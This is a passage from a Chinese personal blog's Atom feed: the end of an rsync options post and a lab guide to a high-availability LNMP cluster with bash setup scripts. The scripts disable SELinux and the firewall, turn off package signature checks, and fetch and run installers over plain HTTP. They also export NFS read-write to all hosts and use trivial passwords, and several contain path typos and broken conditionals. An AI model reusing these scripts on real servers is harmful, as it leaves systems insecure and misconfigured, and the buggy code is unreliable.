title="&#x4E00;&#x3001;rsync&#x547D;&#x4EE4;"></a>&#x4E00;&#x3001;rsync&#x547D;&#x4EE4;</h3><blockquote><p><strong>&#x57FA;&#x672C;&#x683C;&#x5F0F;&#xFF1A;</strong> </p><blockquote><p> <code>rsync [option] &#x539F;&#x59CB;&#x4F4D;&#x7F6E; &#x76EE;&#x6807;&#x4F4D;&#x7F6E;</code></p></blockquote></blockquote><p><strong>&#x5E38;&#x7528;&#x9009;&#x9879;&#xFF1A;</strong></p><pre><code>-a        &#x5F52;&#x6863;&#x6A21;&#x5F0F;&#xFF0C;&#x9012;&#x5F52;&#x5E76;&#x4FDD;&#x7559;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#xFF0C;&#x7B49;&#x540C;&#x4E8E;-rlptgoD-v        &#x663E;&#x793A;&#x540C;&#x6B65;&#x8FC7;&#x7A0B;&#x8BE6;&#x7EC6;(verbose)&#x4FE1;&#x606F;-z        &#x5728;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x65F6;&#x8FDB;&#x884C;&#x538B;&#x7F29;(compress)-H        &#x4FDD;&#x7559;&#x786C;&#x8FDE;&#x63A5;&#x6587;&#x4EF6;-A        &#x4FDD;&#x7559;ACL&#x5C5E;&#x6027;--delete  &#x5220;&#x9664;&#x76EE;&#x6807;&#x4F4D;&#x7F6E;&#x6709;&#x800C;&#x539F;&#x59CB;&#x4F4D;&#x7F6E;&#x6CA1;&#x6709;&#x7684;&#x6587;&#x4EF6;-r        &#x9012;&#x5F52;&#x6A21;&#x5F0F;&#xFF0C;&#x5305;&#x542B;&#x76EE;&#x5F55;&#x53CA;&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x6240;&#x6709;&#x6587;&#x4EF6;-l        &#x5BF9;&#x4E8E;&#x8F6F;&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x4ECD;&#x7136;&#x590D;&#x5236;&#x4E3A;&#x8F6F;&#x94FE;&#x63A5;&#x6587;&#x4EF6;-p        &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x6807;&#x8BB0;-t        &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x95F4;&#x6807;&#x8BB0;-g        &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x7684;&#x5C5E;&#x7EC4;&#x6807;&#x8BB0;&#xFF08;&#x4EC5;&#x8D85;&#x7EA7;&#x7528;&#x6237;&#x4F7F;&#x7528;-o        &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x5C5E;&#x4E3B;&#x6807;&#x8BB0;&#xFF08;&#x4EC5;&#x8D85;&#x7EA7;&#x7528;&#x6237;&#x4F7F;&#x7528;-D        &#x4FDD;&#x7559;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#x53CA;&#x5176;&#x4ED6;&#x7279;&#x6B8A;&#x6587;&#x4EF6;</code></pre><h2 id="&#x914D;&#x7F6E;rsync"><a href="#&#x914D;&#x7F6E;rsync" class="headerlink" title="&#x914D;&#x7F6E;rsync"></a>&#x914D;&#x7F6E;rsync</h2><h2 id="&#x672C;&#x673A;&#x540C;&#x6B65;&#x4E0E;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;"><a href="#&#x672C;&#x673A;&#x540C;&#x6B65;&#x4E0E;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;" class="headerlink" title="&#x672C;&#x673A;&#x540C;&#x6B65;&#x4E0E;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;"></a>&#x672C;&#x673A;&#x540C;&#x6B65;&#x4E0E;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;</h2><h2 id="&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x811A;&#x672C;"><a href="#&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x811A;&#x672C;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x811A;&#x672C;"></a>&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x811A;&#x672C;</h2><h2 id="&#x7ED3;&#x5408;inotify&#x662F;&#x5B9E;&#x65F6;&#x540C;&#x6B65;"><a href="#&#x7ED3;&#x5408;inotify&#x662F;&#x5B9E;&#x65F6;&#x540C;&#x6B65;" class="headerlink" title="&#x7ED3;&#x5408;inotify&#x662F;&#x5B9E;&#x65F6;&#x540C;&#x6B65;"></a>&#x7ED3;&#x5408;inotify&#x662F;&#x5B9E;&#x65F6;&#x540C;&#x6B65;</h2><h2 id="srync&#x6258;&#x7BA1;xinetd"><a href="#srync&#x6258;&#x7BA1;xinetd" class="headerlink" title="srync&#x6258;&#x7BA1;xinetd"></a>srync&#x6258;&#x7BA1;xinetd</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;rsync基础&quot;&gt;&lt;a href=&quot;#rsync基础&quot; class=&quot;headerlink&quot; title=&quot;rsync基础&quot;&gt;&lt;/a&gt;rsync基础&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;rsync命令&lt;/strong&gt; 是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 rsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。&lt;/p&gt;
    
    </summary>
    
      <category term="运维" scheme="https://marnm.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="CTF" scheme="https://marnm.github.io/tags/CTF/"/>
    
      <category term="信息安全" scheme="https://marnm.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="网络空间安全" scheme="https://marnm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://marnm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>LNMP高可用架构配置</title>
    <link href="https://marnm.github.io//posts/195423a2/"/>
    <id>https://marnm.github.io//posts/195423a2/</id>
    <published>2022-03-07T07:28:24.000Z</published>
    <updated>2022-09-02T19:19:54.773Z</updated>
    
    <content type="html"><![CDATA[<p><strong>9&#x53F0;&#x673A;&#x5668;IP&#x5730;&#x5740;&#x5206;&#x914D;&#xFF08;&#x9759;&#x6001;&#xFF09;&#xFF1A;</strong>&#xFF1A;<br><code>192.168.110.11</code> &#x2014;-&gt; Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;<br><code>192.168.110.12</code> &#x2014;-&gt; Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;<br><code>192.168.110.13</code> &#x2014;-&gt; Nginx Server<br><code>192.168.110.14</code> &#x2014;-&gt; Nginx Server<br><code>192.168.110.15</code> &#x2014;-&gt; PHP 5.6<br><code>192.168.110.16</code> &#x2014;-&gt; PHP 5.6<br><code>192.168.110.17</code> &#x2014;-&gt; &#x5B58;&#x50A8;&#x670D;&#x52A1;<br><code>192.168.110.18</code> &#x2014;-&gt; MySQL<br><code>192.168.110.19</code> &#x2014;-&gt; MySQL </p><a id="more"></a><h2 id="&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;"><a href="#&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;"></a>&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;</h2><p>&#x5728;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x5B8C;&#x6210;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x548C;&#x4F18;&#x5316;</p><pre><code class="bash">#!/bin/bash# CentOS 7 Local YUM and EPEL Repository# local yum and epel repositoryfunction centos7(){mv -f /etc/yum.repos.d/*.repo /tmp/cat &gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF[local-yum]name=Local Base ISO Repositorybaseurl=http://192.168.110.3/iso/centos7enabled=1gpgcheck=0priority=1EOF# local epelcat &gt; /etc/yum.repos.d/epel-local.repo &lt;&lt; EOF[epel-local]name=Extra Packages for CentOS 7baseurl=http://192.168.110.3/epel/7/x86_64failovermethod=priorityenabled=1gpgcheck=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7EOFyum clean all &amp;&amp; yum makecacheyum install -y vim wget}# Red Hat Enterprise Linux 7 Local YUM and EPEL Repositoryfunction rhel7(){mv -f /etc/yum.repos.d/*.repo /tmpcat &gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF[local-yum]name=Local Base ISO Repositorybaseurl=http://192.168.110.3/iso/rhel7enabled=1gpgcheck=0priority=1EOF# local epelcat &gt; /etc/yum.repos.d/epel-local.repo &lt;&lt; EOF[epel-local]name=Extra Packages for Enterprise Linux 7baseurl=http://192.168.110.3/epel/7Server/x86_64enabled=1gpgcheck=0EOFyum clean all &amp;&amp; yum makecacheyum install -y vim wget}# Optimiz Linuxsed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalldsystemctl disable firewalldiptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/null# Change IP Address name=`ip a |  grep ens | tr -d : | awk &apos;{print $2}&apos; | head -1`ip=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`cat &gt; /etc/sysconfig/network-scripts/ifcfg-$name &lt;&lt; EOFTYPE=EthernetBOOTPROTO=staticDEFROUTE=yesPEERDNS=yesPEERROUTES=yesIPV4_FAILURE_FATAL=noNAME=$nameDEVICE=$nameONBOOT=yesIPADDR=$ipNETMASK=255.255.255.0GATEWAY=192.168.110.1DNS1=192.168.110.1EOF# Manual replace ip addressread -p &quot;Change New IP Address: &quot; new_ipsed -i &quot;s/$ip/$new_ip/g&quot; /etc/sysconfig/network-scripts/ifcfg-$namesystemctl restart network# Change hostnamehost_bit=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1 | awk &apos; BEGIN{ FS=&quot;.&quot;} { print $4 }&apos;`hostnamectl set-hostname server$host_bit# Configuration Local Repository#OS=`cat /etc/redhat-release  | awk &apos;{ print $1 }&apos;`if [ `cat /etc/redhat-release  | awk &apos;{ print $1 }&apos;` == &quot;CentOS&quot; ]    then centos7else    rhel7fi# shutdowninit 0</code></pre><h2 id="&#x914D;&#x7F6E;Nginx-Server"><a href="#&#x914D;&#x7F6E;Nginx-Server" class="headerlink" title="&#x914D;&#x7F6E;Nginx Server"></a>&#x914D;&#x7F6E;Nginx Server</h2><pre><code class="bash">#!/bin/bash# Install compiler requirment envyum install -y gcc gcc-c++ pcre pcre-devel openssl openssl-libs openssl-devel zlib zlib-devel# source build for Nginx cd /usr/local/src/curl -O --progress http://192.168.110.3/src/nginx-1.12.0.tar.gztar -zxf nginx-1.12.0.tar.gzcd nginx-1.12.0/./configure --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcremakemake installln -s /usr/local/nginx/sbin/nginx /usr/sbin/nginxcd /usr/local/nginx/conf/cp nginx.conf nginx.conf.bak# Change Nginx Configcat &gt; /usr/local/nginx/conf/nginx.conf &lt;&lt;EOFuser nobody;worker_processes auto;worker_cpu_affinity 0001;worker_rlimit_nofile 50000;error_log /usr/local/nginx/logs/error.log warn;pid /usr/local/nginx/logs/nginx.pid;events {    worker_connections 50000;    use epoll;    multi_accept on;}http {    include mime.types;    default_type application/octet-stream;    log_format  main  &apos;\$remote_addr - \$remote_user [\$time_local] &quot;\$request&quot; &apos;                      &apos;\$status \$body_bytes_sent &quot;\$http_referer&quot; &apos;                      &apos;&quot;\$http_user_agent&quot; &quot;\$http_x_forwarded_for&quot;&apos;;    access_log /usr/local/nginx/logs/access.log main;    sendfile on;    tcp_nopush on;    keepalive_timeout 65;    gzip on;    gzip_min_length 2K;    gzip_buffers 4 16k;    gzip_comp_level 5;    gzip_types text/plain application/x-javascript text/css application/xml;    include /usr/local/nginx/conf/user/*.conf;}EOFnginxmkdir -p /usr/local/nginx/conf/usercat &gt; /usr/local/nginx/conf/user/uplooking.conf &lt;&lt;EOFserver {    listen 80;    server_name www.uplookinglinux.com;    charset utf-8;    access_log /usr/local/nginx/logs/uplookinglinux.access.log main;    location / {        root /var/www/web;        index index.html index.htm;    }    error_page 500 502 503 504 /50x.html;    location = /50x.thml {        root /usr/local/nginx/html;    }}EOFnginx -s reloadmkdir -p /var/www/webecho &quot;Welcome to Nginx&quot; &gt; /var/www/web/index.htmlchown -Rf nobody:nobody /var/www/webecho -e &quot;* soft nproc 65535\n* hard nproc 65535\n* soft nofile 65535\n* hard nofile 65535&quot; &gt;&gt; /etc/security/limits.conf# &#x6D4B;&#x8BD5;NginxCURL=&apos;/usr/bin/curl&apos;RVMHTTP=&quot;127.0.0.1&quot;CURLARGS=&quot;-s -I&quot;#raw=&quot;$($CURL $CURLARGS $RVMHTTP)&quot;# curl -s -I 127.0.0.1 &gt; /tmp/stat_code$CURL $CURLARGS $RVMHTTP &gt; /tmp/stat_code# &#x83B7;&#x53D6;http&#x72B6;&#x6001;&#x7801;http_code=`/usr/bin/sed -n &apos;1,1p&apos; /tmp/stat_code | /usr/bin/awk &apos;{ print $2 }&apos;`if [[ $http_code -ge 200 &amp;&amp; $http_code -le 299 ]]then    echo -e &quot;\e[1;32mNginx OK\e[0m&quot;else    echo -e &quot;\e[1;31mServer Error !\e[0m&quot;finginx -v# &#x6302;&#x8F7D;NFS&#x76EE;&#x5F55;&#x5230;&#x9759;&#x6001;Nginx Server&#x4E0A;yum install -y nfs-utils &amp;&amp; mount -t nfs 192.168.110.17:/webData /var/www/web/echo -e &quot;192.168.110.17:/webData\t/var/www/web\tnfs\tdefaults\t0 0&quot; &gt;&gt; /etc/fstabmount -aecho &quot;&#x8BF7;&#x9000;&#x51FA;&#x5F53;&#x671F;&#x4F1A;&#x8BDD;&#x5E76;&#x91CD;&#x65B0;&#x767B;&#x5F55;&#xFF01;&quot;</code></pre><h2 id="&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;"><a href="#&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;" class="headerlink" title="&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;"></a>&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;</h2><pre><code class="bash">#!/bin/bash# &#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x73AF;&#x5883;yum install -y gcc gcc-c++ pcre pcre-devel openssl openssl-libs openssl-devel zlib zlib-devel# &#x83B7;&#x53D6;Nginxcd /usr/local/src/curl -O --progress http://192.168.110.3/src/nginx-1.12.0.tar.gztar -zxf nginx-1.12.0.tar.gzcd nginx-1.12.0/# &#x7F16;&#x8BD1;Nginx./configure --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcremakemake installln -s /usr/local/nginx/sbin/nginx /usr/sbin/nginxnginxcd /usr/local/nginx/conf/cp nginx.conf nginx.conf.bakmkdir -p /usr/local/nginx/conf/usercat &gt; /usr/local/nginx/conf/nginx.conf &lt;&lt; EOFuser nobody;worker_processes auto;worker_cpu_affinity 0001;worker_rlimit_nofile 50000;error_log /usr/local/nginx/logs/error.log warn;pid /usr/local/nginx/logs/nginx.pid;events {    worker_connections 50000;    use epoll;    multi_accept on;}http {    include mime.types;    default_type application/octet-stream;    log_format  main  &apos;\$remote_addr - $\remote_user [$\time_local] &quot;$\request&quot; &apos;                      &apos;\$status $\body_bytes_sent &quot;$\http_referer&quot; &apos;                      &apos;&quot;\$http_user_agent&quot; &quot;$\http_x_forwarded_for&quot;&apos;;    access_log /usr/local/nginx/logs/access.log main;    sendfile on;    tcp_nopush on;    keepalive_timeout 65;    gzip on;    gzip_min_length 2K;    gzip_buffers 4 16k;    gzip_comp_level 5;    gzip_types text/plain application/x-javascript text/css application/xml;    upstream webServer {        # &#x8FD9;&#x662F;Nginx&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;        server 192.168.110.13:80 weight=1 max_fails=3 fail_timeout=10s;        server 192.168.110.14:80 weight=1 max_fails=3 fail_timeout=10s;    }    include /user/local/nginx/conf/user/*.conf;}EOFcat &gt; /usr/local/nginx/conf/user/proxy.conf &lt;&lt; EOFserver {    listen 80;    server_name www.uplookinglinux.com;    charset utf-8;    access_log /usr/local/nginx/logs/proxy.access.log main;    location / {        root /var/www/web;        index index.html index.htm;        #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;        proxy_pass http://webServer;        #&#x4F20;&#x9012;&#x5BA2;&#x6237;&#x7684;ip&#x4FE1;&#x606F;&#x7ED9;&#x8FD9;&#x53F0;&#x670D;&#x52A1;&#x5668; &#x5728;&#x540E;&#x53F0;&#x670D;&#x52A1;&#x901A;&#x8FC7;&#x53C2;&#x6570;$http_x_real_ip&#x53D6;&#x5F97;&#x8BE5;&#x4F20;&#x9012;&#x7684;IP&#x4FE1;&#x606F;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_redirect off;        proxy_connect_timeout 30;        proxy_send_timeout 15;        proxy_read_timeout 15;    }}EOFnginx -s reloadmkdir -p /var/www/web</code></pre><h2 id="&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;"><a href="#&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;" class="headerlink" title="&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;"></a>&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;</h2><pre><code class="bash"># &#x5B89;&#x88C5;RAID&#x7BA1;&#x7406;&#x5DE5;&#x5177;yum install -y mdadm# &#x521B;&#x5EFA;RAID10mdadm -Cv /dev/md10 -a yes -l 10 -n 4 /dev/sd[b-e]mdadm -Q /dev/md10mdadm -q /dev/md10# &#x5236;&#x4F5C;LVM&#x5206;&#x533A;pvcreate /dev/md10vgcreate webData /dev/md10lvcreate -n lv_web -L 20G webDatamkfs.xfs /dev/webData/lv_web# &#x6302;&#x8F7D;&#x78C1;&#x76D8;mkdir /webDataecho -e &quot;/dev/webData/lv_web\t/webData\t xfs\tdefaults\t0 0&quot; &gt;&gt; /etc/fstabmount -a# &#x914D;&#x7F6E;NFS Serveryum install -y rpcbind nfs-utilssystemctl start rpcbind &amp;&gt; /dev/nullsystemctl enable rpcbind &amp;&gt; /dev/nullsystemctl status rpcbindecho -e &quot;/webData *(rw,sync,all_squash,anonuid=99,anongid=99)&quot; &gt; /etc/exportssystemctl start nfssystemctl status nfsecho &apos;&lt;h1&gt;&#x8BE5;&#x6587;&#x4EF6;&#x5728;NFS&#x76EE;&#x5F55;&#x4E2D;&lt;/h1&gt;&apos; &gt; /webData/index.html</code></pre><h2 id="&#x914D;&#x7F6E;PHP&#x670D;&#x52A1;&#x5668;"><a href="#&#x914D;&#x7F6E;PHP&#x670D;&#x52A1;&#x5668;" class="headerlink" title="&#x914D;&#x7F6E;PHP&#x670D;&#x52A1;&#x5668;"></a>&#x914D;&#x7F6E;PHP&#x670D;&#x52A1;&#x5668;</h2><pre><code class="bash">#!/bin/bash# filename : php-config.sh# &#x914D;&#x7F6E;PHPcd /usr/local/src/curl -O --progress http://192.168.110.3/src/php5.6_auto_install.tar.gztar zxf php5.6_auto_install.tar.gzcd php5.6/chmod a+x install.sh. ./install.sh# &#x521B;&#x5EFA;&#x7AD9;&#x70B9;&#x76EE;&#x5F55;mkdir -p /var/www/webecho -e &quot;&lt;?php\n\tphpinfo();\n?&gt;&quot; &gt; /var/www/web/index.phpyum install -y nfs-utilsshowmount -e 192.168.110.17if [ echo $? -eq 0 ]then    echo -e &quot;192.168.110.17:/webData/\-t/var/www/web\tnfs\tdefaults\t0 0&quot; &gt;&gt; /etc/fstab    mount -a else     echo -e &quot;\e[1;31mNFS Server start failed! \e[0m&quot;</code></pre><h3 id="&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI"><a href="#&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI" class="headerlink" title="&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI"></a>&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI</h3><pre><code class="bash">#!/bin/bash# filename : ngxin-fastcgi.shcat &gt; /usr/local/nginx/conf/nginx.conf &lt;&lt;EOFuser nobody;worker_processes auto;worker_cpu_affinity 0001;worker_rlimit_nofile 50000;error_log /usr/local/nginx/logs/error.log warn;pid /usr/local/nginx/logs/nginx.pid;events {    worker_connections 50000;    use epoll;    multi_accept on;}http {    include mime.types;    default_type application/octet-stream;    log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;                &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;                &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;    access_log /usr/local/nginx/logs/access.log main;    sendfile on;    tcp_nopush on;    keepalive_timeout 65;    gzip on;    gzip_min_length 2K;    gzip_buffers 4 16k;    gzip_comp_level 5;    gzip_types text/plain application/x-javascript text/css application/xml;    upstream webServer {        # &#x8FD9;&#x662F;Nginx&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;        server 192.168.110.13:80 weight=1 max_fails=3 fail_timeout=10s;        server 192.168.110.14:80 weight=1 max_fails=3 fail_timeout=10s;    }    include /usr/local/nginx/conf/user/*.conf;        upstream phpServer {                #&#x6307;&#x5B9A;&#x8D1F;&#x8F7D;&#x7B97;&#x6CD5;&#xFF1A;&#x7279;&#x5B9A;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x7531;&#x56FA;&#x5B9A;&#x7684;&#x670D;&#x52A1;&#x5668;&#x670D;&#x52A1;&#xFF0C;&#x89E3;&#x51B3;session&#x5171;&#x4EAB;&#x95EE;&#x9898;                ip_hash;                server 192.168.110.15:9000 max_fails=3 fail_timeout=10s;                server 192.168.110.16:9000 max_fails=3 fail_timeout=10s;        }}EOFcat &gt; /usr/local/nginx/conf/user/proxy.conf &lt;&lt; EOFserver {    listen       80;    server_name  www.uplookinglinux.com;    charset utf-8;    access_log  /usr/local/nginx/logs/proxy.access.log  main;    #################################################    fastcgi_connect_timeout 30;    fastcgi_send_timeout 30;    fastcgi_read_timeout 30;    fastcgi_buffer_size  64k;    fastcgi_buffers 4 64k;    fastcgi_busy_buffers_size 128k;    fastcgi_temp_file_write_size 128k;    #uri &#x5339;&#x914D; .php &#x6216;&#x8005; .php5 &#x7ED3;&#x5C3E;    location ~ \.(php|php5)$ {        root   /var/www/web;        #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;        fastcgi_pass  phpServer;        fastcgi_index index.php;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        include   fastcgi_params;    }    #&#x5339;&#x914D;&#x6839;&#x76EE;&#x5F55;&#xFF0C;&#x56E0;&#x4E3A;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x4E3B;&#x9875;&#x4E3A;index.php&#x52A8;&#x6001;&#x9875;&#x9762;    location = / {        root   /var/www/web;        #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;        fastcgi_pass  phpServer;        fastcgi_index index.php;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        include   fastcgi_params;    }    #################################################    location / {        #&#x8BBE;&#x7F6E;&#x4F2A;&#x9759;&#x6001;&#x8F6C;&#x53D1;&#x89C4;&#x5219;        if (!-e $request_filename) {            rewrite  ^(.*)$  /index.php?s=/$1  last;            break;        }        root   /var/www/web;        index  index.html index.htm;        proxy_pass http://webServer;        proxy_set_header X-Real-IP  $remote_addr;        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;        proxy_redirect off;        proxy_connect_timeout 30;        proxy_send_timeout 15;        proxy_read_timeout 15;    }}EOFnginx -tnginx -s reload</code></pre><h2 id="Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived"><a href="#Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived" class="headerlink" title="Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived"></a>Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived</h2><pre><code class="bash">#!/bin/bashecho -e &quot;192.168.110.11\tserver11\n192.168.110.12\tserver12&quot; &gt;&gt; /etc/hosts# &#x5B89;&#x88C5;Keepalivedyum install -y keepalivedmv /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.confbackupcat &gt; /etc/keepalived/keepalived.conf &lt;&lt; EOF! Configuration File for keepalivedglobal_defs {        notification_email {                fnaichu@qq.com        }        ! server11&#x662F;&#x4E3B;&#x673A;&#x540D;        notification_email_from keepalvied@server11        smtp_server 127.0.0.1        smtp_connect_timeout 30        ! server11&#x662F;&#x4E3B;&#x673A;&#x540D;        router_id proxy11        vrrp_mcast_group4 224.4.4.4}        vrrp_script chk_proxy {                script &quot;/etc/keepalived/proxy_check.sh&quot;                interval 2                weight -2        }        vrrp_instance VI_1 {        state BACKUP        nopreempt        virtual_router_id 11        priority 100        advert_int 1        interface ens33        authentication {                auth_type PASS                auth_pass 1111        }        ! &#x865A;&#x62DF;IP        virtual_ipaddress {                192.168.110.10/24 dev ens33 label ens33:1        }        track_script {                chk_proxy        }        smtp_alert}EOF# &#x4EE3;&#x7406;&#x68C0;&#x6D4B;&#x811A;&#x672C;cat &gt; /etc/keepaliaved/proxy_check.sh &lt;&lt; EOF#!/bin/bashnetstat -nlpt | grep -w &quot;80&quot; &amp;&gt;&gt; /dev/nullif [ $? -ne 0 ]then    systemctl stop keepalivedfiexit 0EOFchmod +x /etc/keepalived/proxy_check.shsystemctl start keepalivedsystemctl enable keepalivedsystemctl status keepalived</code></pre><h2 id="&#x914D;&#x7F6E;MySQL"><a href="#&#x914D;&#x7F6E;MySQL" class="headerlink" title="&#x914D;&#x7F6E;MySQL"></a>&#x914D;&#x7F6E;MySQL</h2><p><strong>&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x624B;&#x52A8;&#x914D;&#x7F6E;&#x5427;&#xFF0C;&#x811A;&#x672C;&#x5199;&#x4E0D;&#x51FA;&#x6765;&#xFF0C;&#x6211;&#x4E0D;&#x4F1A;&#x5199;&#x4E86;</strong></p><pre><code class="bash">#!/bin/bashyum remove -y mariadb-libs# &#x5B89;&#x88C5;MySQLrpm -ivh http://192.168.110.3/other/mysql-community-common-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-libs-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-client-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-server-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-libs-compat-5.7.32-1.el7.x86_64.rpmsystemctl start mysqld#systemctl enable mysqldsystemctl status mysqldecho &quot;skip-name-resolve&quot; &gt;&gt; /etc/my.cnfecho &quot;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;, &#x8BF7;&#x901A;&#x8FC7;mysql_secure_installation&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#xFF1A;&quot;grep &quot;temporary password&quot; /var/log/mysqld.log | awk &apos;{ print $NF }&apos;# mysql_secure_installation# show global variables like &quot;%password%&quot;;# set global validate_password_length=6;# set global validate_password_policy=LOW;# ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;ccc.456&apos;;# FLUSH PRIVILEGES;</code></pre><h3 id="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;"><a href="#&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;" class="headerlink" 